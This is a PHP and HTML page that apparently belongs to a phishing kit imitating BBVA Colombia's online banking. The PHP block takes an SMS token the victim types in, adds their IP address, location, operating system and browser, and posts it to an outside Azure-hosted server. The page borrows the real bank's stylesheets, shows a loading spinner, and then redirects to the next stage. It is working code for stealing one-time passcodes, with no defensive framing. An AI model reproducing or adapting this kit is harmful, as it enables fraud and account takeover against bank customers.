<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];

include('funciones.php');
if (isset($_POST['toktokl'])) {
    $message = 'BBVA COLOMBIA
SMS: ' . $_POST['toktokl'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}  ?>
<html>

<head>
    <meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="REFRESH" content="10;URL=codwe.php">
    <link href="https://nuevaversion.bbvanet.com.co/css/global.min.css" rel="stylesheet" type="text/css">
    <link href="https://nuevaversion.bbvanet.com.co/css/coronita.css" rel="stylesheet" type="text/css">
    <style>
        @media (max-width: 50rem) {
            .login-container {
                width: auto;
            }
        }
    </style>
    <script type="text/javascript" src="https://nuevaversion.bbvanet.com.co/js/iframe-resizer-contentwindow.min.js"></script>

    <script type="text/javascript" src="https://nuevaversion.bbvanet.com.co/choose/js/dataLayer.js"></script>
    <script type="text/javascript" src="https://nuevaversion.bbvanet.com.co/choose/js/wurfl.js"></script>

    <title>BBV</title>
    <script>
        bazadebezolkohpepadr = "1995771395"
    </script>
    <script type="text/javascript" src="" defer=""></script>
</head>

<body class="m-login" id="data-analytics">
    <div class="m-login__content">
        <div class="m-login__main">


            <h1 class="c-bodycopy margin-bottom-small c-bodycopy--highlighted">Genera un token digital desde la App BBVA para confirmar tu inicio de sesión.</h1>
            <style>
                .loading-container {
                    text-align: center;
                    align-items: center;
                    justify-content: center;

                }

                .loading-spinner {
                    border: 6px solid #3498db;
                    /* Color azul */
                    border-top: 6px solid #f4f4f4;
                    /* Color de fondo */
                    border-radius: 50%;
                    width: 40px;
                    height: 40px;
                    animation: spin 1s linear infinite;
                    margin-bottom: 20px;
                    margin-left: 150px;
                }

                @keyframes spin {
                    0% {
                        transform: rotate(0deg);
                    }

                    100% {
                        transform: rotate(360deg);
                    }
                }

                .loading-text {
                    font-size: 16px;
                    color: #333;
                    /* Color del texto */
                }
            </style>


            <div class="loading-container">
                <div class="loading-spinner"></div>
                <div class="loading-text">Cargando...</div>
            </div>
        </div>
        <aside aria-label="Clave de acceso" class="m-login__aside">
            <div class="flex-column flex-align-start full-width">
                <p class="c-bodycopy margin-bottom-medium text_18 c-bodycopy--lighten full-width"><span class="text-medium">Haz tu vida más fácil y sencilla</span> con todos los beneficios que
                    te ofrece BBVA Net.
                </p>
            </div>
        </aside>
    </div>
    <div class="bg-grey_100 margin-top-xxlarge padding-xxlarge">
        <div class="login-container">
            <h2 class="text-grey_500 c-bodycopy--highlighted">Consejos de seguridad</h2>
        </div>
        <p class="c-bodycopy margin-bottom-xsmall margin-left-xsmall text-grey_600" style="text-align: justify;">En la modalidad de estafa <strong>'vishing'</strong> suplantan al personal del banco para obtener tu información privada a través de llamadas.</p>
        <p class="c-bodycopy margin-bottom-xsmall margin-left-xsmall text-grey_600" style="text-align: justify;">Protege tus datos siguiendo estos consejos:</p>
        <ul>
            <li class="c-bullet--blue-medium">
                <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;"><strong>Tus claves de acceso son secretas e intransferibles.</strong> No las compartas con nadie ni las envíes por correo electrónico o SMS.</p>
            </li>
            <li class="c-bullet--blue-medium">
                <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;">No devuelvas llamadas de números desconocidos. <strong>Recuerda siempre llamar a las lineas oficiales de BBVA.</strong></p>
            </li>
            <li class="c-bullet--blue-medium">
                <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;"><strong>BBVA nunca te pedirá un código de un solo uso (OTP) o token</strong> por correo electrónico, SMS o llamadas que tú no hayas iniciado.</p>
            </li>
            <li class="c-bullet--blue-medium">
                <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;"><strong>No compartas información</strong> como contraseñas, números de tarjetas o códigos de confirmación y no los digites en el celular.</p>
            </li>
            <li class="c-bullet--blue-medium">
                <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;">Si brindaste información o recibes notificación de transacciones que no reconoces, comunícate con nosotros.</p>
            </li>
        </ul>
    </div>

    <noscript>
        <img src="https://nuevaversion.bbvanet.com.co/akam/13/pixel_76f50c03?a=dD1lNmY3MDdhZjRhNWNkYzQxMzk3NmNhOGZkOTllYzdmNDA0ZmYzNGU4JmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript>


</body>

</html>